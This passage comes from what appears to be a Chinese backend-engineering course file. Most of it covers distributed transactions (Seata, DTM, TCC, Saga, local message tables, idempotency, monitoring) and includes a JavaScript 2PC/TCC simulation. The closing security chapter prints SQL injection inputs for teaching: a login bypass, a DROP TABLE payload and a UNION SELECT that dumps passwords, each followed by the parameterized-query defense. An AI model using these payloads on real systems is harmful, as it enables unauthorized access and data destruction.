[ ] 数据库层用唯一约束兜底
\`\`\`

---

### 十二、分布式事务框架

#### 12.1 Seata

阿里开源的分布式事务框架，支持四种模式：

| 模式 | 说明 | 一致性 | 侵入性 |
|------|------|--------|--------|
| AT | 自动生成补偿 SQL，无侵入 | 最终一致 | 极低 |
| TCC | 手写 Try/Confirm/Cancel | 强一致 | 高 |
| Saga | 长事务编排 | 最终一致 | 中 |
| XA | 基于 XA 协议 | 强一致 | 低 |

**Seata AT 模式原理**：

\`\`\`
AT（Auto Transaction）模式：
  1. 拦截 SQL，执行前记录"before image"（变更前数据）
  2. 执行 SQL
  3. 记录"after image"（变更后数据）
  4. 全局事务提交 → 各分支提交
  5. 全局事务回滚 → 用 before image 自动回滚

  → 业务代码无感知，只需加 @GlobalTransactional
\`\`\`

Java (Seata AT):
\`\`\`java
@GlobalTransactional
public void createOrder() {
    orderService.create(order);       // order-db
    storageService.deduct(itemId);    // storage-db
    accountService.debit(userId);     // account-db
    // 任一失败 → Seata 自动回滚所有
}
\`\`\`

#### 12.2 DTM

DTM 是字节跳动的分布式事务框架，支持 Go/Java/Python 等：

\`\`\`
DTM 支持：
  - Saga
  - TCC
  - 两阶段消息（类似事务消息）
  - XA
  - 工作流（可视化编排）

Go 示例：
  saga := dtmcli.NewSaga(dtmServer, gid).
    Add(orderService+"/create", orderService+"/createCompensate", order).
    Add(stockService+"/deduct", stockService+"/deductCompensate", req)
  saga.Submit()
\`\`\`

#### 12.3 ServiceComb Saga

华为开源的 Saga 框架：

\`\`\`
特点：
  - 基于 Saga 模式
  - 支持协调式（Alpha 协调者 + Omega 事务参与方）
  - Java 生态
\`\`\`

---

### 十三、实战案例：订单+库存+支付跨服务一致性

#### 13.1 业务场景

\`\`\`
用户下单：
  1. 创建订单（订单服务）
  2. 扣减库存（库存服务）
  3. 扣减余额（账户服务）

要求：三个操作要么全成功，要么全回滚。
\`\`\`

#### 13.2 方案选择

\`\`\`
分析：
  - 强一致？余额扣减要求强一致，但订单/库存可最终一致
  - 长流程？不算长（3 步）
  - 性能要求？高（下单是核心路径）

选择：本地消息表 + 消息队列 + 幂等消费
  → 订单服务创建订单（本地事务）+ 写消息表
  → 后台投递消息到 MQ
  → 库存服务/账户服务消费消息，各自幂等扣减
  → 失败重试，最终一致
\`\`\`

#### 13.3 详细设计

\`\`\`
订单服务：
  @Transactional
  createOrder():
    1. 检查库存是否足够（调用库存服务查询，只读）
    2. 创建订单（状态=待处理）
    3. 写本地消息表（消息=订单创建事件）
    → 本地事务保证订单和消息原子性

  后台定时任务（每 500ms）：
    扫描消息表 → 投递到 MQ → 成功更新状态

库存服务：
  消费"订单创建"消息：
    1. 幂等检查（消息表/Redis 去重）
    2. 扣减库存
    3. 如果库存不足 → 发"库存不足"事件 → 订单服务取消订单

账户服务：
  消费"订单创建"消息：
    1. 幂等检查
    2. 扣减余额
    3. 如果余额不足 → 发"余额不足"事件 → 订单服务取消订单

订单服务：
  消费"库存不足"/"余额不足"事件：
    1. 幂等检查
    2. 更新订单状态=已取消
    3. 发"订单取消"事件
    4. 库存服务/账户服务消费"订单取消" → 回滚扣减

补偿机制：
  超时未收到"扣减成功" → 订单服务检查 → 若失败则取消
\`\`\`

#### 13.4 关键设计点

\`\`\`
1. 幂等：每个服务消费消息前先幂等检查
2. 消息可靠：本地消息表 + 重试
3. 状态机：订单状态（待处理→已确认/已取消）
4. 补偿：失败时发反向事件，各服务回滚
5. 超时：订单有超时时间，超时自动取消
6. 对账：定时对账，发现不一致人工介入
\`\`\`

#### 13.5 异常处理

\`\`\`
异常1：订单创建成功，库存扣减失败
  → 库存服务发"库存不足"事件 → 订单取消 → 余额退回

异常2：消息重复投递
  → 幂等检查 → 已处理则跳过

异常3：订单服务宕机
  → 消息表数据在数据库 → 重启后继续扫描投递

异常4：MQ 丢失消息
  → 消息表有记录 → 重新投递
\`\`\`

---

### 十四、本章小结

分布式事务核心知识回顾：

1. **难题**：单机 ACID 在跨服务下失效，网络不可靠导致部分失败。
2. **BASE 理论**：基本可用 + 软状态 + 最终一致，是实践指导。
3. **2PC**：Prepare+Commit，强一致但同步阻塞、协调者单点、性能差。
4. **3PC**：CanCommit+PreCommit+DoCommit，引入超时但仍可能不一致。
5. **TCC**：Try+Confirm+Cancel，业务层两阶段，需处理幂等/空回滚/悬挂。
6. **Saga**：正向事务+补偿事务，适合长流程，最终一致。
7. **本地消息表**：业务+消息同事务+定时扫描投递，简单可靠最常用。
8. **事务消息**：RocketMQ 半消息+回查，比本地消息表更优雅。
9. **最大努力通知**：有限重试+主动查询兜底，适合支付回调。
10. **幂等性**：所有方案的基石，用唯一 ID/状态机/唯一约束保证。
11. **选型**：默认本地消息表，金融用 TCC，长流程用 Saga。
12. **框架**：Seata（AT/TCC/Saga/XA）、DTM、ServiceComb Saga。

## 十三、补偿模式深度详解

### 13.1 补偿的本质

补偿事务不是"撤销"操作，而是"反向操作"。例如：
- 扣款 → 退款
- 创建订单 → 取消订单
- 发货 → 召回
- 发邮件 → 发更正邮件

补偿必须是幂等的，因为补偿操作可能被重试。

### 13.2 补偿设计原则

1. **业务可补偿**：不是所有操作都能补偿（如发送短信、转账到外部）
2. **补偿幂等**：补偿可能执行多次，必须保证幂等
3. **补偿完整**：补偿必须完全逆转正向操作的影响
4. **补偿可见**：补偿结果对用户可见（如退款记录）
5. **补偿审计**：补偿执行需记录日志，便于审计

### 13.3 补偿实现模式

**自动补偿**：系统自动执行补偿逻辑，无需人工干预。适合标准化的、可逆的操作。

**人工补偿**：系统发出补偿工单，人工处理后确认。适合需要人工判断的复杂操作。

**TCC 补偿**：Try-Confirm-Cancel，Cancel 即为补偿。适合资源预留场景。

**Saga 补偿**：长事务中每一步都有对应的补偿操作。适合跨多个服务的长流程。

### 13.4 补偿的挑战

1. 补偿失败：补偿本身也可能失败，需要重试机制
2. 级联补偿：A→B→C 中 C 失败，需要补偿 B 和 A
3. 补偿超时：补偿不能无限等待，需要超时机制
4. 部分补偿：某些步骤无法完全补偿（如已发的通知）
5. 补偿顺序：必须按反向顺序补偿

### 13.5 Saga 补偿执行流程

以订单流程为例：创建订单 → 扣库存 → 扣余额 → 发通知

1. 创建订单 → 成功
2. 扣库存 → 成功
3. 扣余额 → 失败（余额不足）
4. 补偿扣库存 → 回滚库存
5. 补偿创建订单 → 取消订单
6. 通知用户下单失败

补偿按反向顺序执行：先补偿步骤 2（扣库存），再补偿步骤 1（创建订单）。

## 十四、事务隔离级别与分布式场景

### 14.1 数据库隔离级别

| 隔离级别 | 脏读 | 不可重复读 | 幻读 |
|---------|------|---------|------|
| Read Uncommitted | 可能 | 可能 | 可能 |
| Read Committed | 不可能 | 可能 | 可能 |
| Repeatable Read | 不可能 | 不可能 | 可能 |
| Serializable | 不可能 | 不可能 | 不可能 |

### 14.2 分布式场景下的隔离问题

分布式事务中，隔离级别更难保证：
- 2PC 在 Prepare 阶段持有锁，降低并发
- Saga 没有锁，中间状态可见（非隔离）
- TCC 在 Try 阶段预留资源，Confirm/Cancel 释放

### 14.3 Saga 的隔离问题

Saga 不提供隔离性，中间状态对外可见。例如：
- 订单创建后、扣余额前，其他事务能看到订单
- 如果余额不足需要补偿，订单状态变更对外可见

解决方案：
1. **语义锁**：在业务状态中加"处理中"状态
2. **交换式更新**：操作可交换（顺序不影响结果）
3. **悲观视图**：读操作重写为不读中间状态
4. **重读**：每次读都重新计算

### 14.4 TCC 的隔离性

TCC 通过 Try 阶段预留资源，天然提供隔离性：
- Try：冻结库存（available - frozen）
- Confirm：扣减冻结库存
- Cancel：解冻

其他事务看到的是"可用库存"（已扣除冻结部分），不会超卖。

### 14.5 2PC 的隔离性

2PC 在 Prepare 阶段加锁，直到 Commit/Rollback 才释放。提供强隔离，但并发性能差。

## 十五、分布式事务工程实践陷阱

### 15.1 常见陷阱

1. **忘记幂等**：所有事务操作和补偿都必须幂等
2. **补偿不可逆**：某些操作（如发短信）无法补偿
3. **超时设置不合理**：超时太短导致误判失败，太长导致阻塞
4. **日志不完整**：事务日志不完整，无法恢复
5. **网络分区**：分区时事务可能一半成功一半失败
6. **重复消费**：MQ 消息重复消费导致重复执行

### 15.2 幂等实现方案

1. **唯一 ID**：每笔交易有唯一 ID，执行前检查是否已处理
2. **状态机**：业务状态流转，只有特定状态才能执行
3. **去重表**：记录已处理的 ID，处理前查询去重
4. **乐观锁**：版本号控制，重复执行版本不匹配
5. **Token 机制**：前端获取 Token，后端一次性使用

### 15.3 事务监控

监控指标：
- 事务成功率
- 事务平均耗时
- 补偿触发率
- 事务超时率
- 重试次数分布

告警规则：
- 成功率 < 99% → P1
- 补偿触发率 > 5% → P2
- 事务耗时 P99 > 5s → P3

### 15.4 事务日志设计

每笔分布式事务需记录：
- 事务 ID（全局唯一）
- 事务类型（2PC/TCC/Saga/本地消息表）
- 参与者列表
- 每个步骤的状态和耗时
- 补偿记录
- 最终结果

日志存储：
- 短期：MySQL/PostgreSQL（查询方便）
- 长期：ES/对象存储（归档）

## 十六、分布式事务框架对比

### 16.1 Seata

阿里开源的分布式事务框架，支持四种模式：

**AT 模式（Auto Transaction）**：
- 无侵入，自动生成补偿 SQL
- 通过 undo_log 表回滚
- 两阶段：一阶段执行业务+记录 undo_log；二阶段提交删 undo_log / 回滚执行 undo
- 适合大多数 CRUD 场景

**TCC 模式**：
- 需要实现 Try/Confirm/Cancel 三个接口
- 资源预留型，隔离性好
- 适合金融场景

**Saga 模式**：
- 长事务，每步定义补偿
- 正向执行，失败时反向补偿
- 适合流程长的业务

**XA 模式**：
- 基于数据库 XA 协议
- 强一致性，但性能差
- 适合传统数据库

### 16.2 DTM

字节跳动/携程系分布式事务框架，Go 实现：
- 支持 Saga、TCC、XA、二阶段消息
- 子事务屏障（解决幂等、空回滚、悬挂）
- 多语言 SDK（Go/Java/Python/Node.js）
- 比 Seata 更轻量

### 16.3 ServiceComb Saga

华为开源的 Saga 框架：
- 基于 Akka 实现
- 支持编排式（Orchestration）Saga
- Alpha 服务协调事务，Omega 执行子事务

### 16.4 框架选型对比

| 维度 | Seata | DTM | ServiceComb |
|------|-------|-----|-------------|
| 语言 | Java | Go | Java/Scala |
| AT模式 | 支持 | 不支持 | 不支持 |
| TCC | 支持 | 支持 | 不支持 |
| Saga | 支持 | 支持 | 支持 |
| 侵入性 | AT无侵入 | TCC需实现 | 需定义补偿 |
| 多语言 | Java为主 | Go/Java/Py/Node | Java |
| 性能 | 中 | 高 | 中 |

## 十七、最终一致性工程实践

### 17.1 最终一致性模型

最终一致性：系统在停止写入后，最终所有副本会收敛到相同状态。

变体：
- 读己之写：自己写的自己能立刻读到
- 读己之写 + 因果一致：因果相关的操作有序
- 单调读：同一客户端不会读到比之前更旧的数据
- 单调写：同一客户端的写操作有序执行

### 17.2 实现最终一致性的手段

1. **异步复制**：主写从异步复制
2. **消息队列**：通过 MQ 异步同步数据
3. **CDC（Change Data Capture）**：监听 binlog 同步
4. **反熵协议**：定期比对修复不一致数据
5. **读修复**：读时发现不一致，触发修复

### 17.3 读己之写一致性

用户写完后立即读，必须看到自己的写。方案：
1. 同步复制：写入所有副本才返回（牺牲性能）
2. Session 粘性：同一用户路由到同一节点
3. 版本号：客户端记录版本号，读时检查

### 17.4 多语言最终一致性实践

Java Spring + Seata AT：注解 @GlobalTransactional，无侵入
Go + DTM：Saga 子事务屏障，幂等保障
Python + Celery：异步任务 + 消息队列，最终一致
Node.js + Bull：Redis 队列 + 重试机制

## 十八、分布式事务测试

### 18.1 测试维度

1. **正常流程**：所有参与者成功
2. **参与者失败**：某步失败触发补偿
3. **协调者失败**：协调者宕机后恢复
4. **网络分区**：分区时事务行为
5. **超时**：事务超时处理
6. **重试**：重复消息幂等性
7. **并发**：同一事务并发执行

### 18.2 故障注入测试

| 注入点 | 方式 | 验证 |
|--------|------|------|
| 参与者超时 | sleep/delay | 超时回滚 |
| 参与者崩溃 | kill 进程 | 重启后恢复 |
| 网络分区 | iptables drop | 分区时行为 |
| 消息重复 | 重复发送 | 幂等处理 |
| 消息乱序 | 延迟+乱序 | 顺序处理 |
| DB 锁等待 | 长事务持锁 | 超时处理 |

### 18.3 混沌测试

混沌工程原则：
1. 定义稳态（正常指标基线）
2. 假设稳态在故障下保持
3. 注入故障（杀节点、网络延迟）
4. 验证假设
5. 扩大爆炸半径

工具：
- Chaos Monkey：随机杀实例
- Chaos Mesh：K8s 混沌测试平台
- Litmus：云原生混沌工程

### 18.4 多语言事务测试框架

Java：Spring Boot Test + Testcontainers + Seata 测试
Go：testify + dockertest + DTM 测试
Python：pytest + testcontainers
Node.js：Jest + testcontainers

## 十九、分布式事务恢复

### 19.1 事务恢复场景

1. 协调者宕机：参与者处于阻塞状态，需重启后恢复
2. 参与者宕机：协调者需等待参与者恢复或标记失败
3. 网络分区：分区恢复后需修复不一致状态
4. 消息丢失：通过日志重放恢复

### 19.2 恢复策略

**日志重放**：
- 事务日志记录每一步操作
- 恢复时从检查点开始重放日志
- 幂等操作保证重放安全

**补偿重试**：
- 定时扫描未完成事务
- 执行补偿操作
- 补偿成功后标记事务完成

**人工介入**：
- 自动恢复失败的复杂事务
- 人工确认后执行操作
- 记录处理过程

### 19.3 事务超时处理

1. 全局超时：事务执行超过最大时间，强制回滚
2. 单步超时：某步超时，标记该步失败
3. 补偿超时：补偿操作超时，重试或告警
4. 超时值建议：正常流程 30s，补偿 10s

### 19.4 悬挂事务处理

悬挂（Suspension）：Try 请求延迟到达，Cancel 已执行，Try 才到。

TCC 悬挂防护：
1. Try 前检查是否已 Cancel
2. Try 插入唯一记录，Cancel 检查是否存在
3. 超时 Try 自动失败

## 二十、跨数据库事务

### 20.1 异构数据库事务

不同数据库（MySQL + MongoDB + Redis）之间的事务：

方案一：分布式事务框架（Seata AT）
- 统一 undo_log 管理
- 生成各数据库的反向 SQL
- MongoDB/Redis 需自定义补偿

方案二：本地消息表 + 最终一致
- 主库写消息表（本地事务）
- 异步发送到其他库
- 失败重试

方案三：应用层编排
- 定义每步操作和补偿
- 手动管理事务状态

### 20.2 分库分表事务

ShardingSphere XA 模式：
- 自动管理分片间 XA 事务
- 强一致性
- 性能较差

ShardingSphere BASE 模式：
- 最终一致
- 性能好
- 需容忍短暂不一致

### 20.3 多数据源管理

Java：AbstractRoutingDataSource 动态切换数据源
Go：sqlx + 多 DB 连接
Python：SQLAlchemy 多引擎
Node.js：Sequelize/TypeORM 多连接

## 二十一、事务性能优化

### 21.1 减少事务范围

1. 缩短事务时间：不在事务中做远程调用
2. 减少参与方：能异步的不要同步
3. 细粒度锁：行锁优于表锁
4. 批量提交：多个小事务合并

### 21.2 异步化

1. 非核心逻辑异步化（发通知、记日志）
2. 消息队列解耦
3. 最终一致性替代强一致

### 21.3 缓存优化

1. 事务前预校验（缓存读取校验条件）
2. 事务后更新缓存
3. 减少事务中 DB 查询

### 21.4 性能指标

| 指标 | 目标 | 说明 |
|------|------|------|
| 事务耗时 P99 | < 1s | 用户可接受 |
| 事务成功率 | > 99.9% | 稳定性 |
| 补偿率 | < 1% | 健康度 |
| 并发吞吐 | > 1000 TPS | 视场景 |

## 二十二、事务运维实践

### 22.1 事务监控大屏

核心指标展示：
- 实时事务数（TPS）
- 事务成功率
- 平均耗时
- 补偿触发率
- 异常事务数

### 22.2 告警规则

| 告警 | 条件 | 级别 |
|------|------|------|
| 事务失败率高 | > 1% | P1 |
| 补偿率高 | > 5% | P2 |
| 事务积压 | > 1000 | P2 |
| 事务超时 | > 5s | P3 |
| 协调者宕机 | 任意 | P0 |

### 22.3 事务治理

1. 定期清理过期事务日志
2. 压测验证事务性能
3. 演练故障恢复流程
4. 事务降级方案（关闭非核心事务）
5. 事务熔断（事务失败率过高时降级）

### 22.4 多语言事务运维

Java：Seata 控制台 + Prometheus 指标
Go：DTM 管理面板 + 自定义指标
Python：Celery Flower 监控
Node.js：Bull Dashboard + Prometheus

## 二十三、分布式事务实战案例

### 23.1 电商下单案例

业务流程：创建订单 → 扣库存 → 扣余额 → 发通知 → 加积分

事务分析：
- 创建订单：订单库，本地事务
- 扣库存：库存库，远程调用
- 扣余额：账户库，远程调用
- 发通知：消息队列，异步
- 加积分：积分库，消息队列触发

方案选择：本地消息表 + Saga

执行流程：
1. 创建订单（本地事务，同时写消息表）
2. 发送消息：扣库存
3. 库存服务消费消息，扣库存，发送回执
4. 收到回执，发送消息：扣余额
5. 余额服务消费消息，扣余额，发送回执
6. 收到回执，订单状态改为"已支付"
7. 异步发通知、加积分

失败处理：
- 库存不足：补偿订单（取消）
- 余额不足：补偿库存（回滚）+ 补偿订单（取消）
- 网络超时：重试，幂等保证

### 23.2 转账案例（TCC）

业务：A 向 B 转 100 元

TCC 流程：
1. Try：冻结 A 的 100 元（可用余额 - 100，冻结 + 100）
2. Try：预增 B 的 100 元（预增 + 100）
3. Confirm：扣减 A 的冻结 100 元
4. Confirm：B 的预增转为可用余额
5. （失败时）Cancel：解冻 A 的 100 元
6. （失败时）Cancel：取消 B 的预增

幂等保障：每笔转账有唯一事务 ID，每步操作前检查是否已执行。

### 23.3 跨库数据同步案例

场景：MySQL 主库数据同步到 Elasticsearch 和 Redis

方案：CDC（Change Data Capture）
1. Canal 监听 MySQL binlog
2. 解析变更事件
3. 投递到 Kafka
4. 消费者写入 ES 和 Redis
5. 失败重试，幂等写入

优点：对业务零侵入，准实时，顺序保证。

### 23.4 事务模式选择决策树

1. 单库事务？→ 本地事务（数据库 ACID）
2. 跨库但同一 DBMS？→ XA 事务
3. 跨服务、强一致？→ 2PC/Seata AT
4. 跨服务、最终一致、短流程？→ 本地消息表
5. 跨服务、最终一致、长流程？→ Saga
6. 跨服务、资源预留？→ TCC
7. 跨服务、异步通知？→ 最大努力通知
8. 跨服务、事务消息？→ RocketMQ 事务消息

### 23.5 多语言分布式事务实战对比

Java（Seata AT）：
- @GlobalTransactional 注解
- 自动生成 undo_log
- 无侵入，适合 CRUD 为主的应用

Go（DTM）：
- Saga 编排式
- 子事务屏障解决幂等
- 轻量，适合云原生

Python（Celery + 本地消息表）：
- Celery 异步任务 + 数据库消息表
- 简单直接，适合 Python 生态

Node.js（Bull + 补偿）：
- Redis 队列 + 手动补偿逻辑
- 灵活，适合轻量场景

## 二十四、分布式事务常见问题

### 24.1 如何保证幂等？

1. 唯一事务 ID + 去重表
2. 状态机校验（只有特定状态才能执行）
3. 乐观锁（版本号控制）
4. Redis SETNX（分布式锁）
5. 数据库唯一约束

### 24.2 如何处理网络超时？

1. 超时后查询确认结果
2. 查询不到则重试（幂等保证）
3. 重试次数限制
4. 超过限制告警人工处理

### 24.3 如何保证消息不丢？

1. 生产端：开启确认（confirm），持久化后返回 ack
2. Broker：持久化存储，多副本
3. 消费端：手动 ack，处理完再确认
4. 死信队列：多次失败的消息进入死信

### 24.4 如何处理重复消息？

1. 消费端幂等（唯一 ID 去重）
2. 数据库唯一约束
3. Redis SETNX 去重
4. 乐观锁版本控制

### 24.5 如何保证消息顺序？

1. 同一 Key 路由到同一分区
2. 单消费者消费每个分区
3. 或多线程消费但按 Key 分发到同一线程

---

### 24.6 分布式事务监控与运维

事务中间件上线后，运维同样关键，否则"一致性保证"会变成"一致性故障"。

#### 1. 关键监控指标

- **事务成功率**：成功提交 / 总事务数，低于 99.9% 需告警
- **事务平均耗时**：从开始到最终 Confirm/Commit 的端到端时间
- **悬挂事务数**：长时间未决的事务（如 2PC 第一阶段后协调者宕机）
- **重试次数**：每个分支事务的平均重试次数，过高说明下游不稳定
- **死信队列堆积**：消息表/Saga 事务消息消费失败后的积压量
- **补偿触发率**：Cancel/回滚操作占比，过高说明业务失败率高

#### 2. 悬挂事务处理

悬挂（Suspension）事务指开始但未结束的事务，常见原因：
- 协调者宕机后未恢复日志
- 网络分区导致部分参与者收不到决策
- 参与者宕机后重启丢失内存状态

处理方案：
1. **超时扫描**：定时任务扫描事务日志表，找出超时未决事务
2. **主动探询**：向所有参与者发送"事务状态查询"请求
3. **强制决策**：若多数参与者已 Commit，则强制 Commit 少数派；若都已 Rollback 则 Rollback
4. **人工介入**：极端情况下冻结账户、对账修正

#### 3. 事务日志设计

事务日志表（如 tx_log）是恢复的基础，关键字段：

| 字段 | 类型 | 说明 |
|------|------|------|
| tx_id | varchar(64) | 全局事务 ID |
| tx_type | varchar(32) | 事务类型（TCC/Saga/XA） |
| status | tinyint | 状态（1-开始 2-提交中 3-已提交 4-回滚中 5-已回滚） |
| participants | json | 参与者列表及各分支状态 |
| start_time | datetime | 开始时间 |
| end_time | datetime | 结束时间 |
| retry_count | int | 重试次数 |

日志表必须与业务表在同一数据库（利用本地事务保证日志先落库），且按时间分区便于归档。

#### 4. 幂等性保障细节

重试必然发生，因此每个分支事务必须幂等。实现要点：
- **唯一键约束**：用 tx_id + branch_id 作为唯一键，重复执行直接返回成功
- **状态机校验**：执行前检查当前状态，已 Confirm 的不再 Cancel
- **Token 机制**：业务侧发放一次性 Token，消费后失效
- **数据库版本号**：乐观锁 UPDATE ... WHERE version = ?

#### 5. 灰度发布与回滚

事务中间件升级风险高，需灰度策略：
- 按租户/流量比例灰度（如先 1% 流量走新版）
- 新旧版本并行运行一段时间，对比事务成功率
- 准备一键回滚开关
- 关键节日封网期禁止变更

#### 6. 常见生产事故

1. **协调者单点**：未做 HA，宕机导致全量事务阻塞 → 必须集群化
2. **日志表爆满**：未及时归档，导致 INSERT 变慢 → 定期归档 + 分区
3. **补偿接口幂等失效**：重复扣款 → 严格幂等 + 对账
4. **网络抖动误判超时**：超时时间设置过短，正常请求被回滚 → 合理设置超时 + 重试
5. **事务跨机房**：延迟高导致 TCC 超时失败率高 → 同机房优先 + 异步最终一致

---

> 下一章我们将进入安全防护实战，学习如何保护系统免受攻击。`,
    code: `// ============================================================
// 分布式事务 —— 2PC 协调者 + TCC + 本地消息表 模拟
// ============================================================

// ---------- 1. 2PC 协调者 ----------
class TwoPhaseCoordinator {
  constructor(name) {
    this.name = name;
    this.participants = [];
  }

  addParticipant(p) { this.participants.push(p); }

  // 执行分布式事务
  execute() {
    console.log(\`\\n[2PC 协调者 \${this.name}] 开始事务\`);
    console.log('--- 阶段1: Prepare ---');
    const votes = this.participants.map(p => {
      const vote = p.prepare();
      console.log(\`  \${p.name} 投票: \${vote ? 'YES' : 'NO'}\`);
      return vote;
    });

    const allYes = votes.every(v => v);
    if (allYes) {
      console.log('--- 阶段2: Commit ---');
      this.participants.forEach(p => {
        p.commit();
        console.log(\`  \${p.name} 已提交\`);
      });
      console.log('[2PC] 事务提交成功');
      return true;
    } else {
      console.log('--- 阶段2: Rollback ---');
      this.participants.forEach(p => {
        p.rollback();
        console.log(\`  \${p.name} 已回滚\`);
      });
      console.log('[2PC] 事务已回滚');
      return false;
    }
  }
}

// 参与者
class Participant {
  constructor(name, willFail = false) {
    this.name = name;
    this.willFail = willFail;
    this.prepared = false;
    this.committed = false;
  }
  prepare() {
    if (this.willFail) return false;
    this.prepared = true;
    return true;
  }
  commit() { this.committed = true; }
  rollback() { this.prepared = false; }
}

// ---------- 2. TCC 框架 ----------
class TccTransaction {
  constructor(name) {
    this.name = name;
    this.branches = []; // { try, confirm, cancel, ... }
  }

  addBranch(name, tryFn, confirmFn, cancelFn) {
    this.branches.push({ name, tryFn, confirmFn, cancelFn, tried: false, confirmed: false });
  }

  execute() {
    console.log(\`\\n[TCC \${this.name}] 开始 Try 阶段\`);
    const tryResults = [];
    for (const b of this.branches) {
      const r = b.tryFn();
      b.tried = true;
      b.tryResult = r;
      tryResults.push(r);
      console.log(\`  Try \${b.name}: \${r ? '成功' : '失败'}\`);
      if (!r) break; // Try 失败，停止
    }

    const allSuccess = tryResults.every(r => r) && tryResults.length === this.branches.length;
    if (allSuccess) {
      console.log('[TCC] Try 全部成功，执行 Confirm');
      for (const b of this.branches) {
        b.confirmFn();
        b.confirmed = true;
        console.log(\`  Confirm \${b.name}: 成功\`);
      }
      return true;
    } else {
      console.log('[TCC] 有 Try 失败，执行 Cancel');
      for (const b of this.branches) {
        if (b.tried) {
          b.cancelFn();
          console.log(\`  Cancel \${b.name}: 成功\`);
        }
      }
      return false;
    }
  }
}

// ---------- 3. 本地消息表 ----------
class LocalMessageTable {
  constructor() {
    this.messages = [];   // 消息列表
    this.consumed = new Set(); // 消费端已处理（幂等）
    this.businessData = []; // 业务数据
  }

  // 业务操作 + 写消息（同事务）
  executeWithMessage(businessOp, msg) {
    // 模拟本地事务：业务和消息原子性
    const result = businessOp();
    this.messages.push({ ...msg, status: 'PENDING', retry: 0, id: this.messages.length + 1 });
    console.log(\`  [本地消息表] 业务执行 + 消息写入（事务）: \${msg.topic}\`);
    return result;
  }

  // 后台扫描投递
  scanAndDeliver(consumer) {
    const pending = this.messages.filter(m => m.status === 'PENDING');
    for (const msg of pending) {
      const success = consumer(msg);
      if (success) {
        msg.status = 'SENT';
      } else {
        msg.retry++;
        if (msg.retry > 3) msg.status = 'FAILED';
      }
    }
  }

  // 消费端幂等处理
  consume(msg, handler) {
    if (this.consumed.has(msg.id)) {
      console.log(\`  [消费端] 消息 \${msg.id} 已处理，幂等跳过\`);
      return false;
    }
    handler(msg);
    this.consumed.add(msg.id);
    return true;
  }
}

// ============================================================
// 演示
// ============================================================

// --- 场景1: 2PC ---
console.log('========== 2PC 两阶段提交 ==========');
console.log('--- 场景A: 全部成功 ---');
const coord1 = new TwoPhaseCoordinator('下单事务A');
coord1.addParticipant(new Participant('订单服务'));
coord1.addParticipant(new Participant('库存服务'));
coord1.addParticipant(new Participant('账户服务'));
coord1.execute();

console.log('\\n--- 场景B: 库存服务失败 ---');
const coord2 = new TwoPhaseCoordinator('下单事务B');
coord2.addParticipant(new Participant('订单服务'));
coord2.addParticipant(new Participant('库存服务', true)); // 模拟失败
coord2.addParticipant(new Participant('账户服务'));
coord2.execute();

// --- 场景2: TCC ---
console.log('\\n========== TCC 事务 ==========');
console.log('--- 场景A: 全部成功 ---');
const tcc1 = new TccTransaction('下单TCC');
let stockFrozen = 0, balanceFrozen = 0;
tcc1.addBranch('库存',
  () => { stockFrozen = 1; return true; },           // Try: 冻结库存
  () => { stockFrozen = 0; console.log('    库存确认扣除'); }, // Confirm
  () => { stockFrozen = 0; console.log('    库存解冻'); }     // Cancel
);
tcc1.addBranch('余额',
  () => { balanceFrozen = 100; return true; },        // Try: 冻结余额
  () => { balanceFrozen = 0; console.log('    余额确认扣除'); },
  () => { balanceFrozen = 0; console.log('    余额解冻'); }
);
tcc1.execute();

console.log('\\n--- 场景B: 余额 Try 失败 ---');
const tcc2 = new TccTransaction('下单TCC-B');
tcc2.addBranch('库存',
  () => { console.log('    库存冻结'); return true; },
  () => {},
  () => { console.log('    库存解冻（补偿）'); }
);
tcc2.addBranch('余额',
  () => { console.log('    余额冻结失败'); return false; },
  () => {},
  () => { console.log('    余额解冻'); }
);
tcc2.execute();

// --- 场景3: 本地消息表 ---
console.log('\\n========== 本地消息表 ==========');
const lmt = new LocalMessageTable();
const orders = [];

// 模拟下单：写订单 + 写消息（同事务）
console.log('--- 下单：写订单 + 写消息（本地事务） ---');
lmt.executeWithMessage(
  () => { orders.push({ id: 1, status: 'created' }); return true; },
  { topic: 'order.created', payload: { orderId: 1 } }
);
lmt.executeWithMessage(
  () => { orders.push({ id: 2, status: 'created' }); return true; },
  { topic: 'order.created', payload: { orderId: 2 } }
);

// 模拟后台扫描投递 + 消费端幂等
console.log('\\n--- 后台扫描投递（含重复投递） ---');
let deliverCount = 0;
const consumer = (msg) => {
  deliverCount++;
  // 模拟第一次投递消息1成功，消息2第一次失败
  if (msg.id === 2 && msg.retry === 0) return false;
  lmt.consume(msg, (m) => {
    console.log(\`  [消费] 处理消息 \${m.id}: orderId=\${m.payload.orderId}\`);
  });
  return true;
};
// 投递两次（模拟重复）
lmt.scanAndDeliver(consumer);
lmt.scanAndDeliver(consumer);

console.log(\`\\n投递次数: \${deliverCount}\`);
console.log('消息状态:', lmt.messages.map(m => ({ id: m.id, status: m.status, retry: m.retry })));
console.log('\\n=== 分布式事务演示完成 ===');
`,
  },

  // =========================================================
  // 第五章：安全防护实战
  // =========================================================
  {
    id: "backend-security",
    group: "分布式与工程化",
    icon: "🛡",
    title: "安全防护实战",
    content: `## 安全防护实战

**安全** 是后端系统的生命线。一个功能强大的系统如果存在安全漏洞，轻则数据泄露、用户损失，重则企业倒闭、法律责任。OWASP（开放 Web 应用安全项目）每年发布的 Top 10 安全风险，是每个后端开发者必须掌握的知识。

本章从 OWASP Top 10 出发，深入讲解注入、XSS、CSRF、越权等常见攻击原理与防御，密码存储安全，加密技术，API 安全，以及安全开发生命周期 SDL，帮助你构建安全可靠的后端系统。

### 一、OWASP Top 10 安全风险详解

OWASP Top 10 是 Web 应用最常见的安全风险榜单，每 3-4 年更新一次。以下是 2021 版的十大风险。

#### 1.1 注入攻击（Injection）

**原理**：攻击者把恶意代码作为输入，被系统当作命令/查询执行。

**SQL 注入**：

\`\`\`
登录接口拼接 SQL：
  sql = "SELECT * FROM users WHERE name='" + username + "' AND pwd='" + password + "'"

攻击者输入 username = "admin' --" （注意引号和注释符）
  sql = "SELECT * FROM users WHERE name='admin' --' AND pwd='xxx'"
  → -- 后面被注释 → 密码检查被绕过 → 直接登录 admin！
\`\`\`

更严重的注入：

\`\`\`
username = "admin'; DROP TABLE users; --"
  → 执行完 SELECT → 再执行 DROP TABLE → 用户表被删！

username = "x' UNION SELECT username, password FROM users --"
  → 把所有用户名密码查出来！
\`\`\`

**防御：参数化查询**

\`\`\`
错误（拼接）：
  sql = "SELECT * FROM users WHERE name='" + name + "'"

正确（参数化）：
  sql = "SELECT * FROM users WHERE name = ?"
  stmt.execute(sql, [name])  → name 作为参数，不会被当 SQL 执行

  → 无论 name 输入什么，都只是字符串值，不会改变 SQL 结构
